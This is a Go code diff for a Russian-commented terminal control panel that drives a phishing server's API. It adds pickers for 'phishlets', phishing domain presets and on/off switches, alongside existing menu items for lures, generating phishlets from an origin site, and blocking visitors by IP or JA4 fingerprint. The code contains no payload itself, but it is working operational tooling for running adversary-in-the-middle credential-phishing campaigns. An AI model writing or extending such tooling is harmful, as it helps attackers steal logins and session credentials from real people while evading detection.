@@ -39,6 +39,10 @@ const (
 	sGenerate
 	sPhishDomain
 	sPhishToggle
+	sDomains
+	sPick
+	sPhishDetail
+	sDomainAdd
 	sResult
 )
 
@@ -59,7 +63,12 @@ func (i item) FilterValue() string { return i.title }
 type model struct {
 	client *Client
 	screen screen
-	conn   string // "node=..." или текст ошибки
+	conn   string
+	pickTitle string
+	pickList list.Model
+	pickKind string
+	pickPhishlet string
+	pickEnabled bool // "node=..." или текст ошибки
 	list   list.Model
 	inputs []textinput.Model
 	labels []string
@@ -79,6 +88,7 @@ func initialModel(c *Client) model {
 		item{"Generate", "новый фишлет: origin→domain→id", sGenerate},
 		item{"Phishlet domain", "сменить base_domains", sPhishDomain},
 		item{"Phishlet on/off", "вкл/выкл без рестарта", sPhishToggle},
+		item{"Domains", "пресеты доменов", sDomains},
 		item{"Quit", "выход (сервер продолжает работать)", sMenu},
 	}
 	delegate := list.NewDefaultDelegate()
@@ -139,6 +149,9 @@ func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 				return m, nil
 			}
 		case "enter":
+			if m.screen == sPick {
+				return m.pickEnter()
+			}
 			return m.onEnter()
 		case "tab", "shift+tab", "up", "down":
 			if m.isForm() {
@@ -153,6 +166,48 @@ func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 		m.list, cmd = m.list.Update(msg)
 		return m, cmd
 	}
+	if m.screen == sPick {
+		if km, ok := msg.(tea.KeyMsg); ok {
+			switch km.String() {
+			case "enter":
+				return m.pickEnter()
+			case "a":
+				if m.pickKind == "domains" {
+					m.inputs, m.labels = mkInputs([]string{"новый домен"}, []string{""})
+					m.focus = 0
+					m.screen = sDomainAdd
+					m.pickPhishlet = ""
+					return m, nil
+				}
+			case "x":
+				if m.pickKind == "domains" {
+					return m.pickDelete()
+				}
+			}
+		}
+		m.pickList, cmd = m.pickList.Update(msg)
+		return m, cmd
+	}
+	if m.screen == sPhishDetail {
+		if km, ok := msg.(tea.KeyMsg); ok {
+			switch km.String() {
+			case "d":
+				return m.openDomainPick(m.pickPhishlet)
+			case "t":
+				on := !m.pickEnabled
+				if err := m.client.SetPhishlet(m.pickPhishlet, nil, &on); err != nil {
+					return m.showResult("on/off: " + err.Error(), true), nil
+				}
+				m.pickEnabled = on
+				state := "выключен"
+				if on {
+					state = "включен"
+				}
+				return m.showResult(m.pickPhishlet+" "+state, false), nil
+			}
+		}
+		return m, nil
+	}
 	if m.isForm() {
 		for i := range m.inputs {
 			if i == m.focus {
@@ -166,8 +221,31 @@ func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 
 func (m model) isForm() bool {
 	return m.screen == sBlock || m.screen == sLure || m.screen == sGenerate ||
-		m.screen == sPhishDomain || m.screen == sPhishToggle
+		m.screen == sDomainAdd
 }
+
+// openPick открывает пикер со списком.
+func (m model) openPick(title, kind string, items []string) model {
+	li := make([]list.Item, 0, len(items))
+	for _, t := range items {
+		li = append(li, pickItem{t})
+	}
+	delegate := list.NewDefaultDelegate()
+	delegate.Styles.SelectedTitle = delegate.Styles.SelectedTitle.
+		Foreground(lipgloss.Color("63")).Bold(true)
+	pl := list.New(li, delegate, 56, 14)
+	pl.Title = title
+	pl.SetShowStatusBar(false)
+	pl.SetFilteringEnabled(false)
+	m.screen, m.pickTitle, m.pickList, m.pickKind = sPick, title, pl, kind
+	return m
+}
+
+type pickItem struct{ title string }
+
+func (i pickItem) Title() string       { return i.title }
+func (i pickItem) Description() string { return "" }
+func (i pickItem) FilterValue() string { return i.title }
 
 func (m model) moveFocus(key string) (tea.Model, tea.Cmd) {
 	m.inputs[m.focus].Blur()
@@ -199,6 +277,125 @@ func mkInputs(labels []string, defaults []string) ([]textinput.Model, []string) 
 		out[i] = ti
 	}
 	return out, labels
+}
+
+
+// phishNames возвращает "id ●/○" строки + карту enabled.
+func (m model) phishNames() ([]string, map[string]bool, error) {
+	det, err := m.client.PhishletsDetail()
+	if err != nil {
+		return nil, nil, err
+	}
+	items := make([]string, 0, len(det))
+	en := map[string]bool{}
+	for _, p := range det {
+		mark := "\u25cf"
+		if !p.Enabled {
+			mark = "\u25cb"
+		}
+		items = append(items, mark+" "+p.ID)
+		en[p.ID] = p.Enabled
+	}
+	return items, en, nil
+}
+
+func phishID(display string) string {
+	f := strings.Fields(display)
+	if len(f) == 0 {
+		return display
+	}
+	return f[len(f)-1]
+}
+
+// openDomainPick — пикер пресетов (+ новый) для фишлета.
+func (m model) openDomainPick(phishlet string) (tea.Model, tea.Cmd) {
+	doms, err := m.client.ListDomains()
+	if err != nil {
+		return m.showResult("domains: " + err.Error(), true), nil
+	}
+	m.pickPhishlet = phishlet
+	items := append([]string{"+ новый домен…"}, doms...)
+	return m.openPick("домен для "+phishlet, "domain", items), nil
+}
+
+// pickEnter — выбор в пикере по kind.
+func (m model) pickEnter() (tea.Model, tea.Cmd) {
+	sel, ok := m.pickList.SelectedItem().(pickItem)
+	if !ok {
+		return m, nil
+	}
+	switch m.pickKind {
+	case "phish-act":
+		m.pickPhishlet = phishID(sel.title)
+		det, err := m.client.PhishletsDetail()
+		if err != nil {
+			return m.showResult("detail: " + err.Error(), true), nil
+		}
+		for _, p := range det {
+			if p.ID == m.pickPhishlet {
+				m.pickEnabled = p.Enabled
+				m.screen = sPhishDetail
+				return m, nil
+			}
+		}
+		return m.showResult("нет такого фишлета", true), nil
+	case "phish-domain", "phish-toggle":
+		id := phishID(sel.title)
+		if m.pickKind == "phish-toggle" {
+			det, err := m.client.PhishletsDetail()
+			if err != nil {
+				return m.showResult("detail: " + err.Error(), true), nil
+			}
+			on := true
+			for _, p := range det {
+				if p.ID == id {
+					on = !p.Enabled
+				}
+			}
+			if err := m.client.SetPhishlet(id, nil, &on); err != nil {
+				return m.showResult("on/off: " + err.Error(), true), nil
+			}
+			state := "выключен"
+			if on {
+				state = "включен"
+			}
+			return m.showResult(id+" "+state, false), nil
+		}
+		return m.openDomainPick(id)
+	case "domain":
+		if strings.HasPrefix(sel.title, "+ ") {
+			m.inputs, m.labels = mkInputs([]string{"новый домен"}, []string{""})
+			m.focus = 0
+			m.screen = sDomainAdd
+			return m, nil
+		}
+		if m.pickPhishlet == "" {
+			return m.showResult("домен: " + sel.title, false), nil
+		}
+		if err := m.client.SetPhishlet(m.pickPhishlet, []string{sel.title}, nil); err != nil {
+			return m.showResult("domain: " + err.Error(), true), nil
+		}
+		return m.showResult(m.pickPhishlet+" → "+sel.title, false), nil
+	case "domains":
+		return m.showResult("домен: " + sel.title + "  (a-добавить x-удалить)", false), nil
+	}
+	return m, nil
+}
+
+// pickDelete удаляет выбранный пресет и обновляет список.
+func (m model) pickDelete() (tea.Model, tea.Cmd) {
+	sel, ok := m.pickList.SelectedItem().(pickItem)
+	if !ok {
+		return m, nil
+	}
+	if err := m.client.RemoveDomain(sel.title); err != nil {
+		return m.showResult("del: " + err.Error(), true), nil
+	}
+	doms, err := m.client.ListDomains()
+	if err != nil {
+		return m.showResult("domains: " + err.Error(), true), nil
+	}
+	return m.openPick("пресеты доменов  (a-добавить x-удалить)", "domains", doms), nil
 }
 
 func (m model) onEnter() (tea.Model, tea.Cmd) {
@@ -238,11 +435,11 @@ func (m model) onEnter() (tea.Model, tea.Cmd) {
 			}
 			return m.showResult(strings.TrimRight(b.String(), "\n"), false), nil
 		case sPhishlets:
-			ph, err := m.client.Phishlets()
+			items, _, err := m.phishNames()
 			if err != nil {
-				return m.showResult("phishlets: "+err.Error(), true), nil
+				return m.showResult("phishlets: " + err.Error(), true), nil
 			}
-			return m.showResult("в строю:\n  ▸ "+strings.Join(ph, "\n  ▸ "), false), nil
+			return m.openPick("select phishlet", "phish-act", items), nil
 		case sBlock:
 			m.inputs, m.labels = mkInputs(
 				[]string{"IP или JA4", "причина"},
@@ -264,15 +461,23 @@ func (m model) onEnter() (tea.Model, tea.Cmd) {
 				[]string{"", "", ""})
 			m.focus = 0
 		case sPhishDomain:
-			m.inputs, m.labels = mkInputs(
-				[]string{"phishlet id", "domains csv"},
-				[]string{"", ""})
-			m.focus = 0
+			items, _, err := m.phishNames()
+			if err != nil {
+				return m.showResult("phishlets: " + err.Error(), true), nil
+			}
+			return m.openPick("phishlet -> domain", "phish-domain", items), nil
 		case sPhishToggle:
-			m.inputs, m.labels = mkInputs(
-				[]string{"phishlet id", "on/off y/n"},
-				[]string{"", ""})
-			m.focus = 0
+			items, _, err := m.phishNames()
+			if err != nil {
+				return m.showResult("phishlets: " + err.Error(), true), nil
+			}
+			return m.openPick("phishlet -> on/off", "phish-toggle", items), nil
+		case sDomains:
+			doms, err := m.client.ListDomains()
+			if err != nil {
+				return m.showResult("domains: " + err.Error(), true), nil
+			}
+			return m.openPick("domain presets (a-add x-del)", "domains", doms), nil
 		}
 		return m, nil
 	}
@@ -302,6 +507,21 @@ func (m model) onEnter() (tea.Model, tea.Cmd) {
 		}
 		lines := strings.SplitN(yml, "\n", 14)
 		return m.showResult(strings.Join(lines, "\n")+"\n…", false), nil
+	case sDomainAdd:
+		domain := strings.TrimSpace(m.inputs[0].Value())
+		if domain == "" {
+			return m.showResult("need domain", true), nil
+		}
+		if err := m.client.AddDomain(domain); err != nil {
+			return m.showResult("add: " + err.Error(), true), nil
+		}
+		if m.pickPhishlet != "" {
+			if err := m.client.SetPhishlet(m.pickPhishlet, []string{domain}, nil); err != nil {
+				return m.showResult("domain: " + err.Error(), true), nil
+			}
+			return m.showResult(m.pickPhishlet+" -> "+domain, false), nil
+		}
+		return m.showResult("preset added: "+domain, false), nil
 	case sPhishDomain:
 		raw := strings.ReplaceAll(m.inputs[1].Value(), " ", ",")
 		var domains []string
@@ -366,6 +586,16 @@ func (m model) View() string {
 		return m.header() + "подключение к API…"
 	case sMenu:
 		return m.header() + m.list.View()
+	case sPick:
+		return m.header() + m.pickList.View() + footStyle.Render("\nenter — выбрать")
+	case sPhishDetail:
+		state := "○ выключен"
+		if m.pickEnabled {
+			state = "● включен"
+		}
+		info := "фишлет  " + m.pickPhishlet + "\nстатус  " + state
+		return m.header() + boxStyle.Render(info) +
+			footStyle.Render("\nd — сменить домен · t — вкл/выкл · esc — назад")
 	case sResult:
 		st := okStyle.Render("✓ OK")
 		if m.isErr {
